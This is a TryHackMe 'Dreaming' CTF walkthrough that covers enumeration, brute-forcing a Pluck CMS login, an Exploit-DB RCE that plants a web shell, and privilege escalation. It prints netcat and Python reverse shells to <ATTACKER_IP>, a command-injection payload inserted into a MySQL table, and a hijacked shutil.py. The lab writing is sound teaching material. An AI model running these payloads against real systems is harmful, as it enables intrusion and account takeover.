---
description: https://tryhackme.com/r/room/dreaming
---

# Tryhackme - Dreaming Writeup

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Welcome to Walktrough of the Dreaming room.

#### We will focus on applying Multiple techniques as Enumeration, Vulnerability Hunting as well as misconfigurations exploit.

{% hint style="info" %}
This writeup is done on a Kali Linux Virtual Machine with tools up to date at 19/12/2024\
Follow My Cyber Website for more infos about cyber: [https://seculture.gitbook.io/hack-it/](https://seculture.gitbook.io/hack-it/)
{% endhint %}

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Here is our task.

* Finding `Lucien` flag
* Finding `Death` flag
* Finding `Morpheus` flag

### Starting Information context

* Only the IP is known and will be called \<IP> in this writeup
* Every flag has format \*\*\*{SOME\_TEXT}

## Table of Content

* Enumeration
* Web Analysis
* Service app Exploit
* Flag 1 - Lucien, finding relevant files
* Flag 2 - Death, Mysql Manipulation
* Flag 3 - Morpheus, Python Library Hijacking

## 1 - First Step - Enumeration

With our information, the first thing to do is Enumeration of the services running on the give IP

```bash
nmap <IP>
```

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can then expand information of the services

```
nmap -A -p22,80 <IP>
```

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

From this we can retrieve those informations

| Service Port | Service Name | Version             |
| ------------ | ------------ | ------------------- |
| 22           | ssh          | OpenSSH 8.2p1       |
| 80           | http         | Apache httpd 2.4.41 |

### Most Probable OS : Linux

## 2 - Web Analysis

Now that we know there is a http server, let's see if there is something interseting so let's connect to it in our browser.

```
http://<IP>
```



<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

We are welcomed with a Ubuntu default page. Let's dig into the potential directories using `Gobuster`

```sh
gobuster dir -u "http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Here we use common.txt to start searching for common possible directories

<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Interesting directory: App

Let's go to this page in the browser

```
http://<IP>/app
```

<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

We have access to a directory listing of a `pluck-4.7.13` directory. Let's click on it.\
Our new URL is now

```
http://<IP>/app/pluck-4.7.13/?file=dreaming
```

<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

What can try to see if something is hidden in source code but it doesn't look like it contains anything relevant.

#### Relevant info on the page: admin button on the bottom

<figure><img src=".gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can click on the `admin` button and we will be redirected to

```
http:/<IP>/app/pluck-4.7.13/login.php
```

<figure><img src=".gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

We no have a password field but we don't have password.

* One more time nothing hidden in the source code.

#### At this point we have multiple choices

* Trying to guess the password
* Trying to brute-force the password
* Trying to find a vulnerability associated to the version of pluck found
* Searching the files of the webserver for potential clues

## 2.1 - Check for login page exploit

Let's try to see if there is any vulnerability that could be used directly unauthenticated or one that could give us the access to the correct password or login.

On the Terminal Let's search for exploits using `searchsploit`&#x20;

```sh
searchsploit pluck 4.7.13
```

<figure><img src=".gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

We do find an exploit, Unfortunatly it is a "Authenticated" exploit which means we will need to find the password another way. But let's keep in mind if we are able to log in we could potentially make use of Remote code execution.

## 2.2 - Brute-force login

Since there is no exploit, let's try to brute force the login. First step would be to gather a random test of invalid password. Let's enter a random value in the password field and watch the result of the request in the browser `inspector`. \
We will look at the network tab for the POST request checking the Request body in `RAW` Format.

Value Used for password: `test`

&#x20;

<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

### Important : We retrieved the body for making a brute-force POST attack on this page

```
cont1=test&bogus=&submit=Log+in
```

{% hint style="info" %}
Import to remember to use the correct Content-Type header when doing a Brute-force for POST request.


{% endhint %}

```
Content-Type: application/x-www-form-urlencoded
```

Now let's build our terminal command for brute-forcing the password. Let's use ffuf in POST mode with our header and data. We will set the FUZZ keyword at the value of test that we previously gathered\
Let's use a wordlist with only 1 value "test" to check for incorrect page size.

{% code overflow="wrap" %}
```sh
ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cont1=FUZZ&bogus=&submit=Log+in" -w <WORDLIST> -u http://<IP>/app/pluck-4.7.13/login.php
```
{% endcode %}

Replace IP and Wordlist with your values

<figure><img src=".gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

We can see that Invalid password page size is `1289`&#x20;

Let's filter that with `-fs 1289` and see what it gives us. We will also switch to the rockyou wordlist located at `/usr/share/wordlists/rockyou.txt`  in our machine.

{% code overflow="wrap" %}
```sh
ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cont1=FUZZ&bogus=&submit=Log+in" -w /usr/share/wordlists/rockyou.txt  -u http://<IP>/app/pluck-4.7.13/login.php -fs 1289
```
{% endcode %}

Change the IP for yours.

<figure><img src=".gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

We find the password nearly instantly so I interrupted the search and now we found the correct password for our pluck login page.

### Important info: password

## 2.3 - Login in

Let's see what is on that page. We enter "password" in the login and get access to a new page.

<figure><img src=".gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

There we go, we have access to the dashboard.&#x20;

#### Now we have successfully authenticated. It means that any exploit that needed authentication can now potentially be used. Let's see if we can make use of a reverse shell in this machine.

## 3- Exploiting Pluck

We Earlier found out that there was an exploit. Remember:

<figure><img src=".gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

Let's download it from exploit-db.com to our machine to see if we can use it.

{% embed url="https://www.exploit-db.com/exploits/49909" %}

<figure><img src=".gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

Let's go to our now downloaded file in the terminal and see what we can do with it. Its a python file so we can use (exploit file name will be 49909.py on download but you may change it if you want)

```
python3 <exploit_file_name>
```

It will fail because we need to provide it inputs as parameters in the terminal as it is indicated in the script:

<figure><img src=".gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

We can then use our parameters and the pluckcmspath which is the url path to pluck&#x20;

`/app/pluck-4.7.13`

```sh
python3 <exploit_file_name> <IP> 80 password /app/pluck-4.7.13
```

This is what we get back

<figure><img src=".gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

Let's access that page link and see what we got.

<figure><img src=".gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>

We got a p0wny@shell. We can actually execute linux commands inside of it so let's do a quick reverse shell with reverse shell generator and connect to a terminal instead of that web shell.\
If you don't know how to generate a reverse shell, go to the references at the bottom of the page.

{% embed url="https://www.revshells.com/" %}

I used the `nc mkfifo` rev shell

{% code overflow="wrap" %}
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
```
{% endcode %}

Change the ip and port to your machine's one and before sending the line in the p0wny shell, setup  a netcat listener on your machine on the port you have chosen

```
nc -lvnp <ATTACKER_PORT>
```

<figure><img src=".gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>

#### We now have access to a reverse shell in the machine.

We can then run some commands to understand our context

* pwd
* whoami
* uname -a

<figure><img src=".gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>

We are www-data we can then go to home directory and see if there is any users.

<figure><img src=".gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>

### Important: Every of our users are inside this machine. We will need to dig to have access to every flag.

## FLAG 1 - Lucien

Let's try to focus on the first flag and see what we have access to. Let's Navigate to Lucien home directory and list what is inside

```sh
cd /home/lucien
ls -la
```

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

We are not lucien so we cannot open lucien\_flag.txt. None of the file that are readable as www-data seem interesting. Let's try to see if there is any file that we can read that is owned by lucien.

```sh
find / -type f -readable -user lucien 2>/dev/null
```

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### Important: /opt/test.py

This file is not in lucien's home, let's dig into it and print its content

```sh
cat /opt/test.py
```

<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

### Important: HeyLucien#@1999!

it seems like its a password field.

{% hint style="info" %}
Remember the services at the start, there is a ssh service. If we got the user lucien and a potential password, let's try to connect
{% endhint %}

So for ssh on you machine and not inside the reverse shell

```
ssh lucien@<IP>
Enter password: HeyLucien#@1999!
```

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

We are now connected in SSH in home directory of lucien. We can now print the flag since we are connected as the owner of the file.

```sh
cat /home/lucien/lucien_flag.txt
```

<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Flag is redacted here but we have now found the first flag

## FLAG 2 - Death

Now let's dig into the death's directory

```sh
cd /home/death
```

<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

There is a getDreams.py file but we cannot read or execute it since we are lucien and not death user.\
In the same way we cannot read the flag.

Same as before Let's see if there is any file owned by death that we can read

```sh
find / -type f -readable -user death 2>/dev/null
```

<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

### Important: /opt/getDreams.py

it seems like there is another getDreams.py file in the opt folder that is readable to us. Let's see its content.

```sh
cat /opt/getDreams.py
```

{% code overflow="wrap" %}
```python
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()

```
{% endcode %}

#### We can analyse this script and understand Those main ideas:

* It is a script working with a mysql database
* There is a Database User named death
* His password is redacted so we cannot connect to it
* it connected to a database called `library`&#x20;
* it then connects to the mysql with the field entered

<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* After that it will do a query of `dreamer` and `dream` field of the `dreams` table

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

* The most important part is there

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

* It with gather all the data from the dreamer and dream values in the dreams table and create strings with them `f"echo {dreamer} + {dream}"` . It will after use those strings as if it was a command executing it in the shell. It would be great to insert a reverse shell to this dream value to potentially be executed.
* it thens close the connection to the database

#### So now that we know that, let's see what we can do as our lucien user. Since we have the password let's do a basic

```sh
sudo -l
```

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

User lucien may run the following commands on dreaming: \
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

#### This line means we can execute this command as death using sudo

```sh
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

let's try it:

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We have some fields but nothing really interesting.

Let's see if there is any history of interesting commands our user ran

```
history
```

An intersting field comes at line 24

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

it seems lucien can connect to the mysql database

```
mysql -u lucien -plucien42DBPASSWORD
```

let's try it:

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Let's see what Databases we can see using SQL language. If you want to read more about SQL queries, there is a link provided in [#reference-links](./#reference-links "mention")

```sql
SHOW DATABASES;
```

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

We can see the `library` that we were talking about.

Let's use it to see its content

```sql
USE library;
```

We can now List the tables

```sql
SHOW TABLES;
```

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

We have the dreams table let's enumerate its content

```sql
SELECT * FROM dreams;
```

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Perfect. We see the same inputs as the command that was run previously with the getDreams file.\
Sints those strings are inputed as commands:

#### Let's try to add a value in this table and inside the value let's add a reverse shell to see if we can run it.

We need to first make another rev shell using the same generator with a new port this time.

{% embed url="https://www.revshells.com/" %}

{% code overflow="wrap" %}
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
```
{% endcode %}

Let's craft a SQL payload that will add this revshell to our database.\
Since each line is executed as a shell command let's try to use this format in the table

#### Dream becomes : ";revshell"

We will use the ; to follow the command and run our reverse shell.

Now Let's look at how to add an input to the table:

{% code overflow="wrap" %}
```sql
INSERT INTO dreams (dreamer, dream) 
VALUES ('<value1>', '<value2>');
```
{% endcode %}

Let's use this and put whatever in value1 for the dreamer and the revshell in our format in the dream

{% code overflow="wrap" %}
```sql
INSERT INTO dreams (dreamer, dream) 
VALUES ('test1', ';rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f ');
```
{% endcode %}

{% hint style="info" %}
Make sure to change the Attacker IP and PORT
{% endhint %}

Let's use it and Select our table to see the result

```sql
SELECT * FROM dreams;
```

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Looks good. \
Now let's setup a listener on our attacker machine on the port we have chosen

```sh
nc -lvnp <ATTACKER_PORT>
```

Let's exit the sql with the `exit` keyword and try to run the getDreams.py file with sudo of death user one more time on the ssh connected as lucian.

```
sudo -u death python3 /home/death/getDreams.py
```

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

And Boom we are Death now ! We can get the flag we wanted now

```
cat /home/death/death_flag.txt
```

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

## FLAG 3 - Morpheus

Now that we are connected with death, let's try to read the getDreams.py that had a Redacted password Last time.

```sh
cat /home/death/getDreams.py
```

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

### Important: !mementoMORI666!

this is a password for death. Same as last time let's try to connect via ssh to have a better shell

```
ssh death@<IP>
password: !mementoMORI666!
```

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Perfect. Now Let's go to Morpheus home folder and see what we got

```sh
cd /home/morpheus
ls -la
```

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Important files are:

* kingdom
* morpheus\_flag.txt only readable by morpheus
* restore.py readable by everyone

Let's cat kingdom

```sh
cat kingdom
```

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Not very helpful. Let's try to see restore.py

```sh
cat restore.py
```

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Important Information:

* It uses `shutil` library and calls the `copy2` function renamed as `backup` .
* It looks like a script that would be run by the system in an automated way.

Let's try to execute it to see what happens

```sh
python3 restore.py
```

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

It seems it gets a `Permission denied` error after having called the `backup` function.

#### This is very important. It means that the program actually runs. Since we cannot edit the python file. Let's see if we can edit the library that has the function call

Let's find the library

```sh
find / -name shutil* -type f 2>/dev/null
```

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

### Important: /usr/lib/python3.8/shutil.py

Let's see permissions of this library

```sh
ls -la /usr/lib/python3.8/shutil.py
```

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

We have permissions to edit it since its owned by the group `death` which is our user.

let's edit it using your prefered editor (A bit sad if your prefered editor is not vim tho)

```sh
vim /usr/lib/python3.8/shutil.py
```

Let's search for copy2 function which is the function that has been renamed in restore.py

```
/copy2
```

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Let's try to add a python reverse shell code inside of this function to see if we can have a shell as Morpheus.

Again let's go to reverse shell generator

{% embed url="https://www.revshells.com/" %}

I took the content of python2 in the enclosed quotes. and then separated each lines and removed "`;`"

{% code overflow="wrap" %}
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```
{% endcode %}

Once again change the attacker ip and port and input this code into the copy2 function.

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Let's save the file. Now we need to setup a new listener on attacker machine

```sh
nc -lvnp <ATTACKER_PORT>
```

Now we have an automatic connection after some time since the script is run by the system user.

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

We can now cat the flag and enjoy !

```
cat /home/morpheus/morpheus_flag.txt
```

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## Reference links

* How to generate Reverse shells : \
  [https://www.hackingarticles.in/easy-way-to-generate-reverse-shell/](https://www.hackingarticles.in/easy-way-to-generate-reverse-shell/)
* Online Reverse shell generator : \
  [https://www.revshells.com/](https://www.revshells.com/)
* Exploit-DB Pluck 4.7.13 exploit :\
  [https://www.exploit-db.com/exploits/49909](https://www.exploit-db.com/exploits/49909)
* Add a value to SQL Table :\
  [https://www.freecodecamp.org/news/insert-into-sql-how-to-insert-into-a-table-query-example-statement/](https://www.freecodecamp.org/news/insert-into-sql-how-to-insert-into-a-table-query-example-statement/)
* SQL Cheatsheet : [https://media.datacamp.com/legacy/image/upload/v1714149594/Marketing/Blog/SQL\_for\_Data\_Science.pdf](https://media.datacamp.com/legacy/image/upload/v1714149594/Marketing/Blog/SQL_for_Data_Science.pdf)
* Python Library Hijacking :\
  [https://rastating.github.io/privilege-escalation-via-python-library-hijacking/](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)
